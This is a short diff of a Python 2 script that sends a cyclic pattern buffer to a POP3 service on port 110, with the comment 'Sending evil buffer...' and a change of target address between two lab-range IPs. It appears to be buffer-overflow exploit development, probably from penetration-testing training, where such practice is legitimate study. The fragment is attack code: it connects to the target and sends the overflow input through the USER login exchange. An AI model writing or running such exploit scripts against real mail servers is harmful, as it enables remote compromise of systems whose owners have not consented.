@@ -12,7 +12,7 @@ buffer= ('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
 
 #try:
 print'Sending evil buffer...'
-s.connect(('192.168.56.109',110))
+s.connect(('192.168.56.112',110))
 data=s.recv(1024)
 s.send('USER test'+'\n')
 data=s.recv(1024)
